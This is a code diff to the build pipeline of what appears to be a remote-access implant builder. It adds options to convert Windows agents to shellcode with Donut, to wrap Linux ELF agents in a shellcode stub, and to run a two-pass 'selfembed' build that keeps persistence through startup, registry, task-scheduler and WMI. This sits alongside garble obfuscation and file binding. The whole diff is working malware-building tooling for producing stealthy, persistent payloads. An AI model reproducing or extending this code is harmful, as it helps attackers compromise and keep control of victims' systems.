@@ -16,6 +16,8 @@ import {
   toolchainKeyForTarget,
   type EnsuredToolchain,
 } from "./toolchain-manager";
+import { runDonut } from "./donut-manager";
+import { buildLinuxShellcode } from "./linux-shellcode-manager";
 
 function isClientModuleDir(dir: string): boolean {
   return (
@@ -102,6 +104,9 @@ type BuildProcessConfig = {
   outputExtension?: string;
   sleepSeconds?: number;
   boundFiles?: BoundFile[];
+  useDonut?: boolean;
+  useLinuxShellcode?: boolean;
+  shellcodeConsole?: boolean;
   solMemo?: boolean;
   solAddress?: string;
   solRpcEndpoints?: string;
@@ -861,24 +866,10 @@ func runBoundFiles() {
         sendToStream({ type: "output", text: "Linux CGO: static linking enabled (avoids GLIBC version mismatch)\n", level: "info" });
       }
 
+      const isShellcodeMode = !!(config.useDonut || config.useLinuxShellcode);
+
       try {
-        const buildTool = config.obfuscate ? "garble" : "go";
-        const buildTags: string[] = [];
-        if (config.noPrinting) buildTags.push("noprint");
-        if (hasBoundFiles) buildTags.push("hasbinder");
-        if (config.enablePersistence && os === "windows") {
-          const methods = config.persistenceMethods && config.persistenceMethods.length > 0
-            ? config.persistenceMethods
-            : ['startup'];
-          if (methods.includes("startup")) buildTags.push("persist_startup");
-          if (methods.includes("registry")) buildTags.push("persist_registry");
-          if (methods.includes("taskscheduler")) buildTags.push("persist_taskscheduler");
-          if (methods.includes("wmi")) buildTags.push("persist_wmi");
-        }
-        if (isIosTarget) buildTags.push("ios_target");
-        const tagArg = buildTags.length > 0 ? `-tags "${buildTags.join(" ")}" ` : "";
-        logger.info(`[build:${buildId.substring(0, 8)}] Building: ${buildTool} build ${tagArg}${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
-        logger.info(`[build:${buildId.substring(0, 8)}] Environment: GOOS=${effectiveOs} GOARCH=${actualArch} CGO_ENABLED=${env.CGO_ENABLED} CC=${env.CC || "<default>"}${isIosTarget ? " (iOS target via darwin+ios_target tag)" : ""}`);
+        logger.info(`[build:${buildId.substring(0, 8)}] GOOS=${os} GOARCH=${actualArch} CGO=${env.CGO_ENABLED} CC=${env.CC || "<default>"} shellcode=${isShellcodeMode}`);
 
         const garbleFlags: string[] = [];
         if (config.obfuscate) {
@@ -887,42 +878,74 @@ func runBoundFiles() {
           if (config.garbleSeed) garbleFlags.push(`-seed=${config.garbleSeed}`);
         }
 
-        const buildArgs: string[] = [];
-        if (buildTags.length > 0) buildArgs.push("-tags", buildTags.join(" "));
-        buildArgs.push("-trimpath");
-        buildArgs.push("-buildvcs=false");
-        if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
-        buildArgs.push("-o", `${outDir}/${outputName}`, "./cmd/agent");
+        // Base tags: always present regardless of build pass
+        const baseTags: string[] = [];
+        if (config.noPrinting) baseTags.push("noprint");
+        if (hasBoundFiles) baseTags.push("hasbinder");
+        if (isIosTarget) baseTags.push("ios_target");
+        if (config.shellcodeConsole && isShellcodeMode && os === "windows") baseTags.push("shellcode_console");
 
-        let buildCmd;
-        if (config.obfuscate) {
-          const allArgs = [...garbleFlags, "build", ...buildArgs];
-          buildCmd = $`garble ${allArgs}`;
+        // Windows persistence tags (omitted in shellcode mode — handled by two-pass below)
+        const winPersistTags: string[] = [];
+        if (config.enablePersistence && os === "windows" && !isShellcodeMode) {
+          const methods = config.persistenceMethods?.length ? config.persistenceMethods : ["startup"];
+          if (methods.includes("startup")) winPersistTags.push("persist_startup");
+          if (methods.includes("registry")) winPersistTags.push("persist_registry");
+          if (methods.includes("taskscheduler")) winPersistTags.push("persist_taskscheduler");
+          if (methods.includes("wmi")) winPersistTags.push("persist_wmi");
+        }
+
+        const runBuild = async (tags: string[], outputPath: string) => {
+          const buildArgs: string[] = [];
+          if (tags.length > 0) buildArgs.push("-tags", tags.join(" "));
+          buildArgs.push("-trimpath", "-buildvcs=false");
+          if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
+          buildArgs.push("-o", outputPath, "./cmd/agent");
+          let buildCmd;
+          if (config.obfuscate) {
+            buildCmd = $`garble ${[...garbleFlags, "build", ...buildArgs]}`;
+          } else {
+            buildCmd = $`go build ${buildArgs}`;
+          }
+          const proc = buildCmd.env(env).cwd(clientDir).nothrow();
+          for await (const line of proc.lines()) {
+            const trimmed = line.trim();
+            if (trimmed.length > 0) sendToStream({ type: "output", text: line + "\n", level: "info" });
+          }
+          const result = await proc;
+          if (result.exitCode !== 0) {
+            const stderrText = result.stderr.toString();
+            if (stderrText) sendToStream({ type: "output", text: stderrText, level: "error" });
+            throw new Error(`Build failed for ${platform} (exit ${result.exitCode})`);
+          }
+        };
+
+        // Two-pass build: shellcode + persistence
+        if (isShellcodeMode && config.enablePersistence && !platform.startsWith("android-")) {
+          const pass1Path = `${outDir}/${outputName}.pass1`;
+          const pass1Tags = [...baseTags];
+          if (os === "windows") {
+            const methods = config.persistenceMethods?.length ? config.persistenceMethods : ["startup"];
+            if (methods.includes("startup")) pass1Tags.push("persist_startup");
+            if (methods.includes("registry")) pass1Tags.push("persist_registry");
+            if (methods.includes("taskscheduler")) pass1Tags.push("persist_taskscheduler");
+            if (methods.includes("wmi")) pass1Tags.push("persist_wmi");
+          }
+          sendToStream({ type: "output", text: `Two-pass shellcode+persistence build\n  Pass 1: agent with persistence (tags: ${pass1Tags.join(" ")})\n`, level: "info" });
+          await runBuild(pass1Tags, pass1Path);
+
+          const pass1Data = fs.readFileSync(pass1Path);
+          const selfbinPath = path.join(clientDir, "cmd", "agent", "selfbinary.bin");
+          fs.writeFileSync(selfbinPath, pass1Data);
+          fs.unlinkSync(pass1Path);
+
+          const pass2Tags = [...baseTags, "selfembed"];
+          sendToStream({ type: "output", text: `  Pass 2: selfembed wrapper (tags: ${pass2Tags.join(" ")})\n`, level: "info" });
+          await runBuild(pass2Tags, `${outDir}/${outputName}`);
+          try { fs.unlinkSync(selfbinPath); } catch {}
         } else {
-          buildCmd = $`go build ${buildArgs}`;
-        }
-
-        const proc = buildCmd.env(env).cwd(clientDir).nothrow();
-        let result: any;
-        for await (const line of proc.lines()) {
-          const trimmed = line.trim();
-          if (trimmed.length > 0) {
-            sendToStream({ type: "output", text: line + "\n", level: "info" });
-          }
-        }
-
-        result = await proc;
-
-        logger.info(`[build:${buildId.substring(0, 8)}] Process exited with code: ${result.exitCode}`);
-
-        if (result.exitCode !== 0) {
-          const stderrText = result.stderr.toString();
-          if (stderrText) {
-            sendToStream({ type: "output", text: stderrText, level: "error" });
-          }
-          const errorMsg = `Build failed with exit code ${result.exitCode}\n`;
-          sendToStream({ type: "output", text: errorMsg, level: "error" });
-          throw new Error(`Build failed for ${platform}`);
+          const tags = [...baseTags, ...winPersistTags];
+          await runBuild(tags, `${outDir}/${outputName}`);
         }
 
         const filePath = `${outDir}/${outputName}`;
@@ -1119,12 +1142,44 @@ func runBoundFiles() {
         }
         // ── End IPA packaging ─────────────────────────────────────────────────
 
+        // ── Donut: Windows PE → shellcode ──────────────────────────────────
+        let finalOutputName = outputName;
+        let finalOutputSize = finalSize;
+
+        if (config.useDonut && os === "windows") {
+          sendToStream({ type: "status", text: `Converting ${platform} PE to shellcode…` });
+          sendToStream({ type: "output", text: `\nConverting PE → shellcode with Donut...\n`, level: "info" });
+          const scOutputName = deps.sanitizeOutputName(outputName.replace(/\.[^.]+$/, ".bin"));
+          const binPath = path.join(outDir, scOutputName);
+          const donutArch = (actualArch === "386" ? "386" : "amd64") as "386" | "amd64";
+          const ok = await runDonut(filePath, binPath, donutArch, sendToStream);
+          if (!ok) throw new Error(`Donut shellcode conversion failed for ${platform}`);
+          try { fs.unlinkSync(filePath); } catch {}
+          finalOutputName = scOutputName;
+          finalOutputSize = Bun.file(binPath).size;
+          sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
+        }
+
+        // ── Linux ELF → shellcode stub ──────────────────────────────────────
+        if (config.useLinuxShellcode && os === "linux") {
+          sendToStream({ type: "status", text: `Wrapping ${platform} ELF as shellcode…` });
+          sendToStream({ type: "output", text: `\nWrapping ELF with Linux shellcode stub...\n`, level: "info" });
+          const scOutputName = deps.sanitizeOutputName(outputName + ".bin");
+          const binPath = path.join(outDir, scOutputName);
+          const ok = buildLinuxShellcode(filePath, binPath, sendToStream);
+          if (!ok) throw new Error(`Linux shellcode wrap failed for ${platform}`);
+          try { fs.unlinkSync(filePath); } catch {}
+          finalOutputName = scOutputName;
+          finalOutputSize = Bun.file(binPath).size;
+          sendToStream({ type: "output", text: `Shellcode ready: ${finalOutputSize} bytes → ${finalOutputName}\n`, level: "success" });
+        }
+
         (build.files as any[]).push({
-          name: outputName,
-          filename: outputName,
+          name: finalOutputName,
+          filename: finalOutputName,
           platform,
           version: agentVersion,
-          size: finalSize,
+          size: finalOutputSize,
         });
       } catch (err: any) {
         const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
